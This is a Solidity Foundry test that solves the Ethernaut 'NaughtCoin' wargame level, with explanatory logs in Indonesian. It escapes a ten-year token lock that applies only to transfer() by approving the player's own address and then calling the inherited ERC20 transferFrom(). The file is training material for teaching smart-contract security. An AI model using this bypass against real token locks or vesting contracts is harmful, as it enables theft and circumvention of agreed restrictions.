// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../16-NaughtCoin/NaughtCoinFactory.sol";
import "forge-std/Test.sol";

contract NaughtCoinAttack is Test {
    function testNaughtCoin() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address micin = makeAddr("micin");
        Ethernaut ethernaut = new Ethernaut();
        NaughtCoinFactory factory = new NaughtCoinFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(micin, micin);
        address addr = ethernaut.createLevelInstance(factory);
        NaughtCoin coin = NaughtCoin(addr);
        bool adaBalance = coin.balanceOf(micin) != 0;
        assertTrue(adaBalance);
        emit log("Setup done!\nGoal: mengirim token yang dilock selama 10 tahun");
        uint256 balance = coin.balanceOf(micin);
        emit log("contract turunan akan mewarisi function dari contract induk");
        emit log("so, dengan kata lain, jika mengecek contract ERC20, untuk mengirim token tidak hanya transfer() saja");
        emit log(
            "bisa menggunakan transferFrom() yang membuat suatu address dapat mengirimkan token dengan catatan kita perlu melakukan approve() terlebih dahulu ke spender, pertanyaanya, apakah kita bisa berperan menjadi spender?"
        );
        coin.approve(address(micin), balance);
        coin.transferFrom(address(micin), address(coin), balance);
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
        emit log(
            "jika hendak menambahkan modifier, pastikan implementasikan ke semua fungsi yang punya cara kerja sama"
        );
    }
}
